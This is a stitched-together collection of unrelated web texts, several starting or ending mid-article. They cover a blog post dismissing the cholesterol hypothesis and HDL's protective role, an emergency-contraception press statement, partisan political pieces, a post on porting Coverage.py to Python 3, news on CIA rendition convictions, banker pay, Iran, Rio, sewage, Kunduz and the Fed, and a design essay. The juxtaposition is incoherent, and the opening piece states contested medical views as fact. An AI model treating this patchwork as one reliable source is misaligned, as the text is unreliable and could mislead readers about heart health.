Anyway , to return to sex hormones , HDL , and female protection against heart disease .
It is true that a high HDL level is associated with a lower rate of CHD .
I do n’t think that anyone could argue with this , not even me , and I can pick a fight in an empty room .
For this reason , it was decided that HDL protects against CHD .
Quite how , is lost in the mists of time .
Again , it is true that HDL ‘ picks - up ’ loose cholesterol from dead cells and transports it back to the liver , using the ‘ reverse cholesterol transport system . ’
But if you want to explain how it manages to suck cholesterol out of an atherosclerotic plaque , then you are going to have to travel well past the realms of the improbable , and into the zone of the completely impossible .
HDL is travelling through an artery when , suddenly , it spots a cholesterol laden plaque .
It stops at that exact point and transports itself through the endothelium .
Bravely , battling against a concentration gradient , our plucky HDL locks onto the plaque , sucks cholesterol out , changes direction , reverses back through the endothelium and into the bloodstream .
From there to the liver where it heroically unloads its package of ‘ Bad cholesterol . ’
File under : Great Myths of the Western World .
Despite this , it has become another established truth that HDL is not just associated with a reduced rate of CHD ; it is , in fact , an active protective factor .
Oh , would someone please set up a university dedicated to teaching the difference between an a ssociation , a cause , and an effect .
All researchers into CHD will be forced to attend , and beaten with large clubs until they finally understand that when you find factor X is raised in condition Y , it does not mean that factor X causes condition Y .
Other explanations are possible - thwack !
‘ Repeat after me , other explanations are possible . ’
Thwack !
‘ And have another Thwack for good measure - you dolt . ’
From this , you may be able to gather that I am not a great supporter of the hypothesis that HDL protects against CHD .
So it came as no great surprise to me to find that , although HRT raises HDL levels and thus , according to accepted wisdom , should protect against CHD , when this was finally studied , guess what ?
The rate of CHD in women on HRT went up .
Despite the increase in HDL , ( and a decrease in LDL ) .
To quote from the conclusion of the heart and estrogen / progestin study .
Conclusion ‘ Although many mechanistic and observational studies suggest that estrogen or estrogen plus progestin reduces the risk of morbidity and mortality from CHD in postmenopausal women , the HERS ( The heart and estrogen / progestin study ) , the only large , randomised , controlled study of this question to date , failed to confirm this .
Until data from ongoing studies are available , health care providers must reconsider prescribing ERT or HRT for the secondary prevention of CHD . ’
This study was completely negative .
Actually it was worse than negative ; death rates from CHD rose in the first year of treatment .
And these results were confirmed by a further study called ‘ The effects of estrogen replacement on the progression of coronary - artery atherosclerosis . ’
This too showed no benefit of HRT on CHD .
These results have been so negative that the American Heart Association was forced to re-write their guidelines in 2001 , and now recommends strongly against using HRT to protect against CHD .
Not only , it would appear , do female sex hormones fail to protect against CHD .
They actually make it worse .
In reality , what has happened with women , and CHD , is something that I consider to be quite extraordinary .
Over the years it gradually became a ‘ known fact ’ that a high cholesterol / LDL level causes CHD , yet it was also discovered that women had high cholesterol levels and low rates of CHD , so an ad - hoc hypothesis was developed , which is that women are protected by their sex hormones .
This in itself is not extraordinary ; it ’s what happened next .
And what happened is that the sex hormone theory became so popular that it , in turn , become a ‘ known fact , ’ despite a complete and utter lack of evidence .
In fact , whenever anyone has studied female sex hormones in relation to CHD they have only found results that completely contradict the ‘ protection ’ hypothesis .
Yet , this is just completely ignored .
Swept blithely under the carpet .
When I have discussed this issue with researchers in the area they merely shrug and state words to the effect , ‘ Oh well , they must be protected by something else then . ’
No attempt to state what the amazing protective ‘ factor ’ may be ?
But , of course , we are now into the ‘ Neptune is angry ’ form of circular argument .
‘ Why do women , who have LDL / cholesterol levels just as high as men , if not higher , have a low rate of CHD ? ’
‘ Because they are protected . ’
‘ How do you know that ? ’
‘ Because they have high LDL / cholesterol levels and a low rate of CHD , and a high LDL / cholesterol level is the cause of CHD , so they must be protected . ’
Strip away all of the scientific jargon and this is all that is left of the cholesterol hypothesis when you look at women and CHD .
In reality , the rate of CHD in women should be another fatal wound in the cholesterol hypothesis .
But , as I have pointed out before , fatal wounds have no effect on the cholesterol hypothesis , or the LDL hypothesis , or the diet - heart hypothesis , or the Omega 3 fatty acid hypothesis - or whatever it has currently mutated into .
For this hypothesis is now an article of faith , and you ca n’t kill faith with facts .
For faith , to quote from the Bible : ‘ Faith is the substance of things hoped for ; the evidence of things not seen . ’
Just try arguing against that .

Marie Stopes International : New emergency contraceptive pill launched in the UK
A new emergency contraceptive pill called ellaOne® is today available to women in the UK , following the launch of the pill in Europe .
Leading sexual health charity Marie Stopes International makes the following statement :
" We are pleased that a new emergency contraceptive pill , a vital component in the prevention of unintended pregnancies , has been launched today .
There are over 15 methods of contraception currently available in the UK , and women should be encouraged to discuss their contraceptive options with their doctor or family planning nurse to find a regular method to best suit their needs and lifestyle .
However , no method of contraception is 100 % effective , and emergency contraception plays a vital role in preventing the emotional , social and financial consequences of an unintended pregnancy .
Emergency contraception should not replace a regular contraceptive method , but is a valuable back - up in emergency situations when a regular contraceptive method has not been used consistently or has failed - if a woman has forgotten to take her contraceptive pill , or when a condom breaks for example .
EllaOne can be taken up to five days after unprotected sex , with sustained efficacy across the five days .
This may be beneficial to women who can not access emergency contraception promptly , for example women who have unprotected sex whilst on holiday or over the weekend when doctors surgeries and pharmacies might be closed .
However ellaOne is only available with a prescription , so women wishing to use it should visit their doctor as soon as possible for advice .
It is also important to remember that emergency contraception does not protect against sexually transmitted infections ( STIs ) .
We would encourage women who have had unprotected sex to visit their GP or local family planning centre for an STI test . "

Once again the elitists on Capitol Hill have set their own agenda above that of the constituency .
The Saturday vote on the government - run healthcare bill , should be noted as a blatant disregard for the wants and needs of the citizen .
That seems to be setting the stage for “ taxation , without proper representation “ .
The ever - increasing cost of such legislation can do nothing good for the citizenry .
The government - run rationing of healthcare for seniors and veterans , an over - reaching tax hike for small business , and forced coverage with a criminal mandate is just the base of my concern .
The very aspect of such a government reach is surely to be seen as an act against the Constitution .
The Constitution is a platform for our very existence , as a nation .
Without such accord , we would fall to a dismal standing .
In all the writings of this glorious document , I am still not able to understand where the document sets the accordance of the right to healthcare .
Further , I can see no legitimacy for such a government - mandated policy .
I have taken upon myself to read the Constitution , and it 's precedence among the founding of our Republic .
Now , let it be known , I am not a constitutional scholar .
Yet , it is found to be educational for the citizen to read the Constitution .
I encourage all to enlighten themselves with such readings .
My children are fully aware of our founding documents , and are encouraged to read and ask questions about such .
It can only secure your status as a citizen .
As well as a duty and responsibility for all Americans .
As to the constitutionality of government - run healthcare , I can not find it .
I would like to know what the the constituency thinks on this matter .
What do you think ?
Is it constitutional ?
If so , why and how ?
The great State of Indiana has been burdened by the agenda of the elitists on Capitol Hill , as well as their own State Assembly .
The blame has to be laid upon those of guilt , and a measure of that blame can be laid squarely with our local government .
Our State Assembly has been nowhere to be seen while the sovereignty of our rights , as a state , has been disseminated .
Where are they now ?
Have they bothered to ask if you needed support from the state level ?
No , of course not .
They use the excuse of , “ the federal mandate overtakes that of the state ” .
Well , all I ask for is representation .
Will they stand up and defend the Indiana Constitution ?
My door has not had a knock .
Nor has my phone rang .
The support of the people cannot be seen as coming from our own representatives of the state .
They should be polling the constituency on what the needs and wants are .
Am I right ?
We pay our taxes , now we want representation .
If our very own legislators are n't there to support our needs and wants , then where is it to come from ?
As Citizens ' Sovereign , we are the legitimate convening authority .
Such authority is inherent in both the U S Constitution and the Indiana Constitution .
U S Constitution :
Amendment I
Congress shall make no law respecting an establishment of religion , or prohibiting the free exercise thereof ; or abridging the freedom of speech , or of the press ; or the right of the people peaceably to assemble , and to petition the government for a redress of grievances .
Amendment IX
The enumeration in the Constitution , of certain rights , shall not be construed to deny or disparage others retained by the people .
Amendment X
The powers not delegated to the United States by the Constitution , nor prohibited by it to the states , are reserved to the states respectively , or to the people .
Indiana Constitution :
ARTICLE 1 .
Bill of Rights .
Section 1 .
WE DECLARE ,
That all people are created equal ; that they are endowed by their CREATOR with certain inalienable rights ; that among these are life , liberty , and the pursuit of happiness ; that all power is inherent in the people ; and that all free governments are , and of right ought to be , founded on their authority , and instituted for their peace , safety , and well - being .
For the advancement of these ends , the people have , at all times , an indefeasible right to alter and reform their government .
Section 2 .
All people shall be secured in the natural right to worship ALMIGHTY GOD , according to the dictates of their own consciences .
Section 3 .
No law shall , in any case whatever , control the free exercise and enjoyment of religious opinions , or interfere with the rights of conscience .
It can be found especially intriguing that Section One of the Indiana Constitution makes statement of “ … an indefeasible right to alter and reform their government . ”
An amazing statement if taken as to the very definition of indefeasible .
“ Not capable of being annulled , voided , or undone . ”
That very meaning could be a designation of American Citizen .
Am I wrong ?
If yes , then how so ?
It is time to set the stage for a return to our own sovereignty , and therefore the proof shown to our elected officials .
This proof is the right of authority to that of the Citizen Sovereign .
The duties and responsibilities of our elected officials are to be enforced .
The enforcement of such duties will be shown by a simple vote .
That vote will set the mandate .
This vote must be shown at all levels of government .
The very aspect of our founding was the need for local representation .
Thus , through such legation , the people show strong .
Again , I must thank all readers for taking the time to ponder my thoughts on this matter .
Remember that I am just one man , and it is all “ One Man 's Opinion ” .
“ REFORM , REFORM , REFORM ! ”
The golf events this year sponsored by Boehner ’s Freedom Project political action committee have stretched from April until October , from Florida to Ohio .
And the minority leader does n’t hold his events at worn - out municipal courses .
The most recent outing was a $ 20,921.34 event at the plush Robert Trent Jones track in Gainesville , Va. , an invitation - only private club that was once also home to the Professional Golfers Association 's President ’s Cup .
The highest expenditure was a September event at the Jack Nicklaus - designed Muirfield Village Golf Club in Dublin , Ohio .
The Freedom Project spent $ 29,501.20 for an event on the course , which hosts the annual PGA Memorial Tournament .
Another favorite of Boehner ’s PAC seems to be the Ritz - Carlton in Naples , Fla. , where the committee spent more than $ 30,000 in April and May .
The Tiburon Golf Course , a 36 - hole course at the hotel , also hosts a professional tournament each year .
If you 've donated to John Boehner 's political action committee , the misnamed Freedom Project PAC , which spent $ 2,693,033 in 2008 , and has already sucked up over a million dollars this year , let me be the first progressive to thank you for the donation .
Although a significant amount of your donations was wasted -- in chunks above $ 10,000 each -- on political losers like Greg Davis ( R - MS ) , Phil English ( R - PA ) , Jay Love ( R - AL ) , Andy Harris ( R - MD ) , Chris Shays ( R- CT ) , Dean Andal ( R- CA ) , Vito Fossella ( R- NY ) , David Cappiello ( R- CT ) , John Stone ( R- GA ) , Fred Dailey ( R- OH ) , Darren White ( R- NM ) , Keith Fimian ( R - VA ) , John Gard ( R - WI ) , and Rick Goddard ( R - GA ) , far more went towards sating the Minority Leader 's golf addiction .
The Muirfield Village Golf Club ( $ 41,374 ) , Disney Resorts ( $ 28,787 ) , Big Horn Golf Club ( $ 25,310 + $ 18,357 ) , Walt Disney Parks & Resorts ( $ 25,200 ) , The Greenbrier ( $ 22,412 ) , La Quinta Resort ( $ 21,818 ) each got far more thanRepublican candidate running for office -- any office .
And Boehner is spending at tony golf resorts at the same clip this year .
Even with GOP candidates dropping out of races because of an inability to raise money , the high living Minority Leader has already dropped another $ 29,501 ---- at the Muirfield Village Golf Club .
He spent even more at the Ritz Carlton in Naples ( where the golfing is supposed to be sublime ) .
Fact of the matter is , Boehner has already spent around $ 83,000 on golfing junkets this year .
And we are so happy to see that money being spent that way instead of towards electing right wing lunatics .
One Republican electoral expert told us , after lots of prodding and a fifth beer , that had Boehner used that money he 's been wasting on golf excursions on Doug Hoffman , who narrowly lost to some little known healthcare - supporting Democrat , Hoffman would have been in Congress and been the deciding vote to stop the healthcare reform bill !

Last weekend I released a version of Coverage .py for Python 3.x .
Getting to that point took a while because 3.x was new to me , and , it seems , everyone is still figuring out how to support it .
I experimented with using 2to3 to create my 3.x code from my 2.x code base , and that worked really well , see Coverage .py on Python 3.x for some details .
For a while , I developed like this , with 3.x code translated by 2to3 so that I could run the tests under Python 3.1 .
But then I had to figure out how to package it .
I did n’t want to have to create a separate package in PyPI for the 3.x support .
I tried for a while to make one source package with two distinct trees of code in it , but I never got setup.py to be comfortable with that .
Setup.py is run during kitting , and building , and installation , and the logic to get it to pick the right tree at all times became twisted and confusing .
( As an aside , setuptools has forked to become Distribute , and they ’ve just released their Python 3 support which includes being able to run 2to3 as part of build and install .
That may have been a way to go , but I did n’t know it at the time . )
Something , I forget what , made me consider having one source tree that ran on both Python 2 and Python 3 .
When I looked at the changes 2to3 was making , it seemed doable .
I adapted my code to a 2 - and - 3 idiomatic style , and now the source runs on both .
Changes I had to make :
¶ I already had a file called backward .py that defined 2.5 stuff for 2.3 , now I also used it to deal with import differences between 2 and 3 .
For example :
try :
from cStringIO import StringIO
except ImportError :
from io import StringIO
and then in another file :
from backward import StringIO
¶ exec changed from a statement to a function .
Syntax changes like this are the hardest to deal with because code wo n’t even compile if the syntax is wrong .
For the exec issue , I used this ( perhaps too ) clever conditional code :
# Exec is a statement in Py2 , a function in Py3
if sys .
hexversion > 0x03000000 :
def exec_function ( source , filename , global_map ) :
" " " A wrapper around exec ( ) . " " "
exec ( compile ( source , filename , " exec " ) , global_map )
else :
# OK , this is pretty gross .
In Py2 , exec was a statement , but that will
# be a syntax error if we try to put it in a Py3 file , even if it is n't
# executed .
So hide it inside an evaluated string literal instead .
eval ( compile ( " " " \
def exec_function ( source , filename , global_map ) :
exec compile ( source , filename , " exec " ) in global_map
" " " ,
" < exec_function > " , " exec "
) )
¶ All print statements have to adopt an ambiguous print (s ) syntax .
The string to be printed has to be a single string , so some comma-separated lists turned into formatted strings .
¶ 2to3 is obsessive about converting any d.keys ( ) use into list ( d.keys ( ) ) , since keys returns a dictionary view object .
If the dict is n’t being modified , you can just loop over it without the list ( ) , but in a few places , I really was returning a list , so I included the list ( ) call .
¶ A few 2to3 changes are fine to run on both , so these :
d . has_key ( k )
d . itervalues ()
callable ( o )
xrange ( limit )
became :
k in d
d . values ()
hasattr ( o , ' __call__ ' )
range ( limit )
¶ Exception handling has changed when you want to get a reference to the exception .
This is one of those syntax differences , and it ’s structural , so a tricky function definition is n’t going to bridge the gap .
Where Python 2 had this :
try :
# .. blah blah ..
except SomeErrorClass , err :
# use err
now Python 3 wants :
try :
# .. blah blah ..
except SomeErrorClass as err :
# use err
The only way to make both versions of Python happy is to use the more cumbersome :
try :
# .. blah blah ..
except SomeErrorClass :
_ , err , _ = sys . exc_info ()
# use err
This is uglier , but there were only a few places I needed it , so it ’s not too bad .
¶ Simple imports are relative or absolute in Python 2 , but only absolute in Python 3 .
The new relative import syntax in Python 3 wo n’t compile in Python 2 , so I ca n’t use it .
I was only using relative imports in my test modules , so I used this hack to make them work :
sys .
path .
insert ( 0 , os .
path .
split ( __file__ ) [ 0 ] ) # Force relative import
from myotherfile import MyClass
By explicitly adding the current directory to the path , Python 3 ’s absolute - only importer would find the file alongside this one in the current directory .
¶ One area that still tangles me up is str/unicode and bytes / str. Python 3 is making a good change here , but it feels like we ’re still in transition .
The docs are n’t always clear on what will be returned , and trying to get the same code to do the right thing under both versions still seems to require experiments with decode and encode .
After making all of these changes , I had a single code base that ran on both Python versions , without too much strangeness .
It ’s way better than having to maintain two packages at PyPI , or trying to trick setup.py into installing different code on different versions .

Comment : Why the Italian Convictions of CIA Officers Matter
November 6 , 2009 by intelNews
By JOSEPH FITSANAKIS | intelNews.org |
An Italian court has convicted 22 CIA officers and a US Air Force officer involved in the abduction of a Muslim cleric from Milan in 2003 .
All but three Americans tried in the case received jail sentences ranging from five to eight years , for kidnapping Hassan Mustafa Osama Nasr in broad daylight and for illegally renditioning him to Egypt , where he says he was brutally tortured before being released without charge .
As intelNews has previously reported , it is extremely unlikely that the US will agree to extradite the convicted abductors to Italy .
Washington has formally invoked the NATO Status of Forces Agreement , arguing that the offenders were operating “ in the course of official duty ” and fall therefore under US , not Italian , jurisdiction .
But the convictions are important nonetheless , for three reasons .
First , because the 23 convicted Americans are now international fugitives , who risk arrest by Interpol , among other law enforcement agencies , upon exiting US territory .
Second , because the convictions marked the conclusion of “ the world ’s first trial involving the CIA ’s extraordinary renditions program since 9/11 ” , and may serve as precedent for a wave of similar court cases around the world .
Third , because the convictions put pressure on the Barack Obama Administration to reconsider its intelligence procedures , in light of the fact that the US President has authorized the CIA to continue its policy on renditions under new CIA director Leon Panetta .
From an intelligence point of view , it is noteworthy that at least two of the Americans involved in Nasr ’s abduction have publicly admitted that the CIA operation broke Italian law .
Speaking yesterday to ABC News , Sabrina De Sousa ( photo ) , who was listed as a “ diplomat ” at the US consulate in Milan at the time of the kidnapping , said the CIA operation “ broke the law ” , but was authorized by Washington , which then proceeded to “ abandon and betray ” those who carried it out , leaving them “ to fend for themselves ” .
Last July , Robert Seldon Lady , who was the CIA ’s station chief in Milan at the time of Nasr ’s kidnapping , acknowledged that the abduction broke Italian law , but argued against the zeal with which Italian prosecutors went after the abductors , because “ most covert activity abroad is illegal and still every country authorizes it [… ] .
I worked in intelligence for 25 years ” , said Lady , “ and almost no activity I did in those 25 years was legal in the country where it happened ” .
Lady ’s statement represents a rare public confession by a member of an Agency not known for its moral introspection .
Perhaps because of this crucial flaw in its institutional character , the CIA has been placed –often unwillingly – at the forefront of the intelligence side of Washington ’s “ global war on terrorism ” .
Like all wars , this conflict involves some very difficult policy choices , ranging from kidnapping and rendition , to torture and the blackmailing of informants .
When the reality of these ugly practices seeps to the surface of “ civilized ” politics , Washington will tend to deny involvement , leaving its CIA operatives to “ fend for themselves ” .
It is one of the advantages of covert paramilitary campaigns .
It is also one of their drawbacks , as clearly reflected in the 23 US government officers , who have now joined countless Islamist terrorists on Interpol ’s international fugitives list .

But three professors at Harvard are disputing that logic in a new study , saying it is an urban myth that executives at Bear and Lehman were wiped out along with their companies .
Though the chiefs at both investment banks lost more than $ 900 million in their stock holdings , the professors argue that it is important to also consider all the riches the bankers took off the table in the years preceding the crisis .
At Lehman , the top five executives received cash bonuses and proceeds from stock sales totaling $ 1 billion between 2000 and 2008 , and at Bear , the top five received more than $ 1.4 billion , according to the study , which was released on Sunday night on the Web site of the Program on Corporate Governance at Harvard Law School .
The payouts came in the form of cash bonuses as well as thousands of shares of stock that the executives sold as the share prices of their companies soared .
Most of the executives sold far more shares during that period than the number they held when their companies hit bottom .
“ There ’s no question they would have done massively better had their firms not collapsed , ” said Lucian Bebchuk , one of the study ’s authors .
“ But the wealth of those top executives was hardly wiped out .
The idea that they were devastated financially has kind of colored the picture people have about what payoffs they were facing . ”
Many of the solutions that policy makers and regulators are considering for Wall Street pay are tactics that were already in place at Lehman and Bear .
Both firms required executives to wait several years before selling their stock .
Both firms paid heavily in stock .
Critics of compensation reform have pointed to these two firms as examples of why change in pay practices may not make a difference and have said the focus should be on things like risk management and regulatory oversight .
However , the Harvard study says the executives may have had reason to focus on the short - term prices they could attain with stock selling .
Mr. Bebchuk has been advising the Treasury Department on compensation at bailed - out companies .
He advocates locking up stock compensation for longer periods as well as pay clawback provisions for years later .
James E. Cayne , the former Bear chief executive , stands out for selling fewer shares over the years than he held at the firm ’s demise .
Mr. Cayne sold 2,720,845 shares for $ 289 million over eight years , beginning in 2000 .
He was still holding 5,685,591 shares at the start of 2008 .
The other Bear executives sold nearly five times as many shares in the years leading up to the firm ’s collapse as they held in 2008 , and at Lehman , the executives sold about 1.3 times the shares they owned at the end .
The study does not take into account that the executives might have sold shares in part to pay hefty tax bills .
Shares of stock are not taxed until they transfer in ownership to executives , which was a period of multiple years at both investment banks .
At that time , some executives sold the number of shares needed to pay the tax bill on the shares they still held .
Some compensation experts said over the weekend that the study did not seem to prove that compensation caused the crisis and that it instead just pointed out that the bankers were wealthy .
“ I do n’t think anybody would question that they were well compensated , ” said René Stulz , a professor at Ohio State University who has studied bank compensation .
“ It ’s certainly true that the incentive effects are different if you ’re already very wealthy , but that does not mean that the incentive effects are not there . ”
Executives at companies that were bailed out by the government have in many cases had their stock holdings recover in value in the last year , and that might have been the case at Bear or Lehman if they had received the same treatment .
Shortly after Bear collapsed , Richard S. Fuld Jr. , the chief executive at Lehman , called Peter J. Solomon , an investment banker who used to work at Lehman .
“ He reiterated the fact that when firms like Bear Stearns fold and if Lehman Brothers got into trouble , the executives own so much stock that they were losing a lot , ” Mr. Solomon recalled over the weekend .
But Mr. Solomon , who has been critical of pay levels and of the fact that investment banks are publicly traded , said the executives who presided over Wall Street ’s collapse have suffered , despite the money they retained .
“ There ’s not one person involved in the demise of Lehman Brothers , Bear or even the troubles that have fallen on Citigroup who thinks they ’re living happily ever after , ” Mr. Solomon said , “ because their reputations have been tarnished , and what do you have at the end of the day but your reputation ? ”
Through intermediaries , several of the executives examined in the study declined to comment .
The other authors of the study were Alma Cohen , a professor visiting Harvard from Tel Aviv University , and Holger Spamann , a lecturer at Harvard .
Iran 's opposition leaders say the country 's clerical rulers are more brutal than the shah 's regime .
Two of Iran 's top pro-reform figures say police used excessive force against anti-government protesters who took to the streets last week on the sidelines of state - sanctioned rallies to mark the 30th anniversary of the US embassy takeover .
Mir Hossein Mousavi and Mahdi Karroubi say authorities even struck women on their heads with batons .
In a web posting Saturday , they called such treatment an ugly act that was not even seen during the shah 's response to the 1979 Islamic revolution that toppled him .
Mousavi and Karroubi have led a protest movement rejecting the legitimacy of President Mahmoud Ahmadinejad 's June re-election .
Protestor gets 8 - year prison term
Meanwhile , an Iranian court on Saturday sentenced a student who took part in protests following Iran 's disputed presidential election this year to eight years in prison , a website reported .
Abdullah Momeni's wife told website Mowjcamp , which backs defeated candidate Mousavi , that Momeni was sentenced to six years for taking part in post-election protests and two years for previous activities concerning national security .
Several other post-election detainees have received jail terms and three people have been sentenced to death , according to Iranian media .
I long ago gave up on the delusion that anything about me was remotely unique .
Instead , I cast this out there as a sort of digital fishing line to find like - bodied individuals .
Do you ever find yourself being better when you ’ve had no sleep ?
Last night I got basically no sleep .
Today I taught three classes and had one faculty meeting and , as far as I can tell , all went swimmingly .
Of course , this may simply be my sleep deprived brain trying to rationalize the day ’s events and positive thoughts require less imagination than horribly negative ones .
In that case , this must be what it ’s like to be stupid .
I know I sound quite the elitist , but hear me out .
I am not saying normally I ’m a genius .
That ’s ridiculous , because no one can verify that until I get my Mensa test scores back .
Moreover , who better to judge my lack of genius ability than myself ?
All I need to do is examine the multiple bumps and bruises I ’ve suffered from walking into walls in my own house to know that I ’m likely not the smartest person in the world .
If I were , what the hell are the rest of you people doing ?
You must have triage units set up in your laundry rooms .
Having said all that , however , I do n’t normally think of myself as stupid .
But do stupid people think of themselves as stupid ?
Sure , we ’ve all heard someone say , “ I ’m stupid at math . ”
But does n’t being self aware enough to diagnose such a limitation imply the opposite of stupidity ?
Is n’t really stupid the person who goes around bragging about their math ability , when surely they ’re on the low end of the scale ?
This is why I resist any self - congratulatory moments .
That ’s just stupid sneaking up on me .
Several thousand extra police officers are on the streets of Rio de Janeiro
Brazilian officials have deployed thousands of extra troops on the streets of Rio de Janeiro a day after violent clashes with gang members .
At least 12 died during the clashes in the city 's Morro dos Macacos - or Monkey Hill - slum .
Police said on Sunday that two suspected drug traffickers had also been killed overnight .
Officials also sought to calm fears about security in a city due to host the 2016 Olympic Games .
" Rio de Janeiro has a safety problem .
We are fully aware of this problem , it is one of the city 's most historic problems , " said state public safety director Jose Mariano Beltrame .
" We proved to the Olympic Committee that we have plans and proposals for Rio de Janeiro . "

He added that the city 's policy is not only about " going into battle , it also consists of keeping the peace " .
On Saturday , two Brazilian policemen were killed after their helicopter was shot down above the city .
The helicopter came down and burst into flames after the pilot was hit in the leg by a bullet .
Several buses were also set on fire during the worst outbreak of violence since the city was awarded the Games two weeks ago .
The attack on the helicopter followed an outbreak of fighting between rival drug gangs in a shanty town in the north of the city .
One resident said it was the one of the most intense gun battles he had witnessed in the area in recent years .
It is not clear whether the sewage systems that have not reported such dumping are doing any better , because data on overflows and spillage are often incomplete .
As cities have grown rapidly across the nation , many have neglected infrastructure projects and paved over green spaces that once absorbed rainwater .
That has contributed to sewage backups into more than 400,000 basements and spills into thousands of streets , according to data collected by state and federal officials .
Sometimes , waste has overflowed just upstream from drinking water intake points or near public beaches .
There is no national record - keeping of how many illnesses are caused by sewage spills .
But academic research suggests that as many as 20 million people each year become ill from drinking water containing bacteria and other pathogens that are often spread by untreated waste .
A 2007 study published in the journal Pediatrics , focusing on one Milwaukee hospital , indicated that the number of children suffering from serious diarrhea rose whenever local sewers overflowed .
Another study , published in 2008 in the Archives of Environmental and Occupational Health , estimated that as many as four million people become sick each year in California from swimming in waters containing the kind of pollution often linked to untreated sewage .
Around New York City , samples collected at dozens of beaches or piers have detected the types of bacteria and other pollutants tied to sewage overflows .
Though the city ’s drinking water comes from upstate reservoirs , environmentalists say untreated excrement and other waste in the city ’s waterways pose serious health risks .
A Deluge of Sewage
“ After the storm , the sewage flowed down the street faster than we could move out of the way and filled my house with over a foot of muck , ” said Laura Serrano , whose Bay Shore , N.Y. , home was damaged in 2005 by a sewer overflow .

Ms. Serrano , who says she contracted viral meningitis because of exposure to the sewage , has filed suit against Suffolk County , which operates the sewer system .
The county ’s lawyer disputes responsibility for the damage and injuries .
German Army chief General Wolfgang Schneiderhan has formally asked to be relieved of duty today following the release of images from the US warplane involved in the September Kunduz air strike showed that German officials were lying about situation leading up to the attack .
Gen. Schneiderhan
The photographs , released by the nation ’s Bild newspaper , show large numbers of civilians at the site of the German - ordered attacked and disproved repeated claims from officials as high ranking as former Defense Minister Franz Jung that there was no evidence of civilian deaths .
Gen .
Schneiderhan sought the resignation and took responsibility for not bringing the facts to the attention of German officials , but a junior member of the defense ministry was also ousted over the revelation , a growing embarrassment to the German government .
The attack killed over 100 people , most of them civilians , and NATO reports suggested that the German colonel who ordered the attack overstepped his authority .
Gen. Schneiderhan had vigorously defended the attack .
Beyond the usual concerns over a massive civilian death toll , the German role in the attack brought uncomfortable attention to the conflict in Germany , whose constitution forbids foreign military engagements .
The government had repeatedly insisted that the Afghan War is n’t technically a war , a claim that is being greeted with increasing incredulity among a war - weary population .
WASHINGTON ( Reuters ) - The Federal Reserve may need to begin to pull back its extensive support for the weak U.S. economy before it has healed enough to substantially lower the jobless rate and get factories working again , Fed Vice Chairman Donald Kohn said on Wednesday .

“ Tightening ( monetary policy ) while there ’s still slack in the economy is something that we have to do every time , ” he told a monetary policy conference at the Cato Institute .
Kohn said the Fed -- the U.S. central bank -- would base its actions on its forecast for the path of the economy , and would not wait for clear evidence the recovery has taken hold :
“ It ’s incumbent upon us to ... be forward - looking in our story .
Yes , there ’s slack , but it ’s going away .
Yes , people are still unemployed , but people are being put back to work .
And the alternative of not tightening and not beginning this process is to create a destabilizing round of inflation .
...
If we ca n’t tell that story we should n’t be tightening . ”
EXIT BEFORE WARNING SIGNS
The Fed has begun to move gradually toward removing its extensive support for the economy during a devastating financial crisis .
At its latest policy - setting meeting , it said it would phase out by March a program to buy mortgage - backed securities that had been aimed at bolstering housing markets .
Most analysts do not expect the Fed to begin to raise benchmark interbank lending rates from near zero until the middle of next year but analysts are watching what it plans to do shrink a balance sheet that has ballooned to over $ 2.3 trillion as a result of aggressive actions to stem the crisis .
Kohn said that while the recovery will likely be sluggish , the Fed would act before warning lights flash on spending or inflation .
“ We must begin to withdraw ( monetary policy ) accommodation well before aggregate spending threatens to press against potential supply , and well before inflation as well as inflation expectations rise above levels consistent with price stability , ” he said .
Kohn and another senior Fed official cautioned that the recovery remains fragile .
Atlanta Fed President Dennis Lockhart said he wants to see more evidence that the private sector can thrive without government support before kicking away the crutches .
“ I do not think that time has yet come , and ... I think it may well be some time before a comprehensive exit need be under way , ” Lockhart told the University of South Alabama ’s economic forum in Mobile , Alabama .
PACE OF EXIT
A European central banker echoed Lockhart ’s caution on removing support too soon and signaled he would be more patient than Kohn in removing programs or raising rates .
“ Now is not the appropriate time to exit , but the process would begin when there are clear signs that markets are functioning properly , the economic recovery is firmly under way , and therefore upside pressures on inflation appear , ” said Athanasios Orphanides , governor of the Central Bank of Cyprus and a member of the European Central Bank ’s governing council , also at the Cato Institute .
Kohn said he could not predict how fast the Fed would raise rates or withdraw its massive supply of money to the financial system and that the Fed would monitor how its extraordinary efforts to support the economy are affecting spending decisions and inflation expectations in timing its exit strategy .
The Fed has the necessary tools to pull back its help for the economy , he said .
Why is this the case ?
It ’s not that the developers deliberately modified the design .
It ’s not that they necessarily consider alignment and whitespace to be unimportant .
It ’s just that these elements in the user interface are often invisible to them .
For a designer , … whitespace is often just as important as the content .
Development teams are responsible for putting interactive features and content into a product .
Empty space is neither feature nor content .
Therefore , it is not a requirement .
For a designer , however , whitespace is often just as important as the content .
As a designer , I spend a lot of time adjusting whitespace to enable effective scanning of content .
I also spend a lot of time refining alignment and padding to establish the right prioritization between user interface elements .
I utilize both of these design elements to guide users through the interactions on a page .
I use them to communicate what ’s most important , what ’s related , and what needs attention .
For designers , these are key requirements of effective communication .
And yes , there ’s a lot of evidence that shows what ’s invisible does make a difference .
A shared understanding of what ’s being built — whether visible or invisible — goes a long way toward making products that our users can understand .
Now before you decide I am a whiny designer just getting on the case of user interface engineers for not building exactly what I designed , let me say that I know what the engineering team does in bridging the gap between a product design and an actual product is invaluable .
But just like designers should know what is possible with HTML and CSS — or whatever happens to be their medium — and how to make their designs bulletproof , development teams should recognize that the space between and around user interface elements and the alignment of those elements may be just as important as the elements themselves .
I ’d love to see more developers bring the skills and craft they apply to the construction of the visible to the construction of the invisible : padding and alignment .
Once they learn to look for these things in a design specification or mockup , they ’ll have a better sense of the designer ’s intent .
A shared understanding of what ’s being built — whether visible or invisible — goes a long way toward making products that our users can understand .
